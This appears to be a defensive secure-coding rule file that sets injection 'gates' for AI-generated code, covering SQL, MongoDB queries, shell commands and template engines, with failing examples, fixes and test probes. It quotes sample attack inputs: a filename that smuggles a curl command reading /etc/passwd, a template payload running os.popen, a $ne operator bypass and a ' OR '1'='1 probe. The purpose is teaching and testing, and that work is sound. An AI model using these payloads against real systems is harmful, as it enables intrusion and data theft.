# Injection

A model asked for "a search endpoint" writes an f-string; asked for "sort by column" it interpolates
the column name; asked for "generate a thumbnail" it reaches for `shell=True`, because the ffmpeg
line it is copying was written for a terminal. Each of those works on every input the developer types
by hand, which is why they survive review. This file gates four interpreters AI hands user data to by
default: SQL, the document-store query object, the shell, and the template engine.

## Load this file when

- Any SQL string is built — driver, query builder, or an ORM's raw escape hatch.
- A sort order, column name, table name or `LIMIT` comes from a request.
- A query object reaches MongoDB, Mongoose or any document-store filter.
- A subprocess, shell command, `exec`, `system` or `child_process` call is constructed.
- A template is compiled from a string, or an expression is evaluated at runtime.
- A request value is concatenated into any string that another system will parse as a language.
- An ORM is in use and the request is "make this query dynamic" — the escape hatches are where the
  ORM stops helping.

## Gates


### Gate 21 — Dynamic SQL identifiers

> Code that places an identifier or SQL keyword not written literally in the source into a query —
> a column, a table, a sort direction — MUST NOT be emitted unless the value is mapped through an
> allowlist of literal strings before it reaches the query.

**Applies when:** a sort column, sort direction, table name or column list derives from a request, a
config value or another service. Recognisable as interpolation into a query outside a value position:
`ORDER BY ${x}`, `SELECT ${cols}`, `FROM ${table}`.


**Fix:** Look the value up in an object of literal strings written in the source, falling back to a
default on a miss, and interpolate the looked-up literal. The lookup — not an escaping function — is
what makes the set of possible queries finite.


### Gate 22 — SQL query construction

> Code that builds a SQL query containing any value not written literally in the source MUST NOT be
> emitted unless that value is passed as a bound parameter.

**Applies when:** any SQL reaches a driver, ORM raw-query API or query builder escape hatch and any
part of it derives from a request, a file, an environment variable or another service.


**Fix:** Pass values as bound parameters using the driver's placeholder syntax and let the driver do
the quoting. Where a genuinely dynamic identifier is needed — a sort column, a table name —
parameters do not apply: validate against an allowlist of literal strings written in the source, and
never interpolate the raw value.


### Gate 24 — Query operator injection

> Code that places a request value into a document-store query object MUST NOT be emitted unless the
> value is coerced to its expected scalar type at the point it enters the object.

**Applies when:** a value from `req.body`, `req.query` or `req.params` enters a filter passed to
`find`, `findOne`, `updateOne` or an aggregation `$match` (MongoDB, Mongoose, or similar).

**Fails:** `const user = await Users.findOne({ resetToken: req.body.token });`

**Why:** A JSON body like `{"token": {"$ne": null}}` arrives as a nested object that Mongo reads as an operator, matching any user — no string to escape, so it looks already-safe.

**Fix:** Coerce at the boundary: `String(...)` for strings, `Number(...)` for numbers, and reject if the result is not what you expected.

### Gate 26 — OS command construction

> Code that builds an OS command containing a value not written literally in the source MUST NOT be
> emitted unless the command is passed as an argument list with no shell, and any value that selects
> the program or a flag is mapped through an allowlist of literal strings.

**Applies when:** `subprocess` with `shell=True`, `os.system`, `os.popen`, `child_process.exec`, or any command assembled by string concatenation/f-string from outside-the-source input.

**Fails:** `subprocess.run(f"ffmpeg -i uploads/{filename} ...", shell=True)`

**Why:** With a shell in the path, a `filename` like `x; curl .../$(cat /etc/passwd);` runs as a second command in the web process.

**Fix:** Pass the command as an argument list with no shell (`shell=False` default; in Node, `execFile`/`spawn` without `shell: true`). The kernel receives the argument vector directly, so there is no shell to interpret `;`, `$()` or backticks — escaping helpers like `shlex.quote` are not the remedy. Whether `filename` is a plausible filename is input validation (Gates 40-49).

### Gate 28 — Runtime evaluation of user input

> Code that passes a value not written literally in the source to a template compiler, an expression
> evaluator or an eval-like API MUST NOT be emitted unless the value is passed as template data,
> bound to a placeholder in a template whose source is written literally.

**Applies when:** `render_template_string`, `Template(...)`, `eval`, `exec`, `new Function`,
`vm.runInNewContext` or any expression evaluator, where part of the compiled string came from a
request, database row or config value.

**Fails:** `return render_template_string(f"<h1>Hello {name}</h1>")`

**Why:** The failing version compiles the request as source, so a `name` like
`{{ cycler.__init__.__globals__.os.popen('id').read() }}` runs as command execution in the app process.

**Fix:** Keep the template source literal and pass the value as a named argument, so the engine parses
markup you wrote and escapes the data. The same holds for `eval` and `new Function` — replace the call.

## Out of scope

- **Whether a filename, path or ID is well-formed.** Traversal, extension, length and type are input
  validation (Gates 40-49). This file gates the interpreter boundary, not the value's shape.
- **Database account privileges.** Least privilege limits what an injection reaches, but no line of
  code passes or fails it — deployment configuration, not an emission decision.
- **Rendering user data as HTML.** `innerHTML` and `dangerouslySetInnerHTML` are `xss.md`, Gates
  50-55 — the browser's parser is a different interpreter with a different escape clause, and it is
  gated where a model deliberately steps out of a framework's escaping. Ordinary interpolation into a
  template is not gated anywhere, because the engines escape it by default. Cite Gate 50 or 51; do
  not stretch Gate 22 over either.
- **Content-Security-Policy and other response headers.** Defence in depth, and ungated —
  `misconfig.md` declines the header set for want of anything binary to check. Report their absence
  without a gate number.
- **LDAP, XPath and SMTP header injection.** Real, but not a default AI mistake — those interpreters
  barely appear in a normal application. Outside the registry; say so rather than stretching Gate 22.
- **Injection through a dependency.** A sanitizer or ORM with a bypass is an unknown flaw in
  third-party code. Airtight checks the code in front of you.
- **Prompt injection into an LLM call.** The boundary is probabilistic, so no binary condition on the
  emitted line exists — a gate that cannot be decided by reading the code is advice.

## Prove probes

- Gate 21 — `GET /api/posts?sort=notacolumn` -> HELD if the response is a normal 200 in the default
  order or a 400, FAILED if the response is a 500 or an error body naming the column or the SQL.
- Gate 22 — `GET /search?q=' OR '1'='1` -> HELD if 200 with the rows literally matching that string
  (usually none), FAILED if it returns the full table or a SQL syntax error.
- Gate 24 — `GET /api/<list-route>?<field>[$ne]=zzz` on a read-only list endpoint -> HELD if 400 or
  zero results, FAILED if records come back whose `<field>` is not the literal string.
- Gate 26 — send the command's input parameter as `probe$(echo airtight)` -> HELD if the error or
  output shows the literal `probe$(echo airtight)`, FAILED if it shows `probeairtight`.
- Gate 28 — send the rendered parameter as `{{7*7}}` -> HELD if the response contains `{{7*7}}`,
  FAILED if it contains `49`.
